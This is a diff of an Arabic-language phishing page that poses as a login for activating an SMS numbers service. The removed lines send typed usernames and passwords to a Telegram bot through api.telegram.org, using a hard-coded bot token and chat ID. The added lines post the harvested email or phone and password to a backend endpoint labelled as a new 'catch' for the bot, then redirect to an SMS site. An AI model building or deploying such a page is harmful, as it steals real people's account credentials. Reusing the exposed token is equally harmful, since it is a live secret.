@@ -3,51 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل بوابة الوصول</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
+    <title>تسجيل الدخول - تفعيل الخدمة</title>
     <style>
-        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
-        .login-card { background: #141b2b; width: 90%; max-width: 380px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        h2 { font-size: 22px; margin-bottom: 10px; }
-        p { color: #8b9bb4; font-size: 14px; margin-bottom: 30px; }
-        input { width: 100%; padding: 16px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; outline: none; box-sizing: border-box; text-align: right; }
-        input:focus { border-color: #00f2fe; }
-        button { width: 100%; padding: 16px; background: #28a745; color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        button:hover { background: #218838; }
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%);
+            display: flex; justify-content: center; align-items: center; height: 100vh;
+        }
+
+        .container {
+            background: white; padding: 30px; border-radius: 12px;
+            box-shadow: 0 10px 50px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
+        }
+
+        #pageImg { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }
+        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }
+
+        input {
+            width: 100%; padding: 12px; margin-bottom: 5px;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
+            text-align: right; transition: 0.3s;
+        }
+
+        /* تنسيق الخطأ عند الإدخال */
+        input.error-border { border: 2px solid red; background-color: #fff0f0; }
+        .error-text { color: red; font-size: 12px; display: none; margin-bottom: 10px; text-align: right; }
+
+        button {
+            width: 100%; padding: 12px; background: #CC0044; color: white;
+            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer;
+            margin-top: 10px; transition: 0.3s;
+        }
+        button:hover { background: #990033; }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <h2>تفعيل بوابة الوصول</h2>
-        <p>يرجى إدخال البيانات للمتابعة</p>
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="معرف المستخدم" required>
-            <input type="password" id="pass" placeholder="رمز الوصول الخاص" required>
-            <button type="submit" id="btn">إتمام التحقق</button>
-        </form>
-    </div>
-    <script>
-        document.getElementById("loginForm").onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById("btn");
-            btn.disabled = true;
-            btn.innerText = "جاري التحقق...";
 
-            const u = document.getElementById("user").value;
-            const p = document.getElementById("pass").value;
+<div class="container">
+    <img id="pageImg" src="https://telegra.ph/file/f792945d7d1f9b8410551.jpg" alt="Logo">
+    <h2 id="pageLetter">سجل دخول لتفعيل خدمة الأرقام</h2>
+
+    <form id="checkForm">
+        <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <div id="errorMsg" class="error-text">⚠️ يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح</div>
+
+        <input type="password" id="passInput" placeholder="كلمة السر" required>
+        <button type="submit" id="pageBtn">تسجيل الدخول</button>
+    </form>
+</div>
+
+<script>
+    // دالة التحقق من صحة البيانات
+    function validate(val) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^[0-9]{7,15}$/;
+        return emailRegex.test(val) || phoneRegex.test(val);
+    }
+
+    document.getElementById('checkForm').onsubmit = async (e) => {
+        e.preventDefault();
+
+        const user = document.getElementById('userInput').value;
+        const pass = document.getElementById('passInput').value;
+        const error = document.getElementById('errorMsg');
+        const input = document.getElementById('userInput');
+
+        if (!validate(user)) {
+            error.style.display = 'block';
+            input.classList.add('error-border');
+            return;
+        }
+
+        // إذا كان الإدخال صحيحاً نرسل للبوت
+        try {
+            await fetch('/api/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    image: "🚀 SMS صيد جديد من الخطة",
+                    letter: "👤 المستخدم: " + user,
+                    button: "🔑 الباسورد: " + pass
+                })
+            });
             
-            // بيانات البوت الخاصة بك
-            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
-            const chatId = "5174578125";
-            const text = `🚀 وصول جديد\n👤 المستخدم: ${u}\n🔑 الرمز: ${p}`;
+            // التوجيه بعد الإرسال بنجاح
+            window.location.href = "https://receive-smss.com/";
+            
+        } catch (err) {
+            console.error("خطأ في الاتصال بالسيرفر");
+        }
+    };
+</script>
 
-            // إرسال البيانات
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-            const img = new Image();
-            img.src = url;
-
-            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 1000);
-        };
-    </script>
 </body>
 </html>
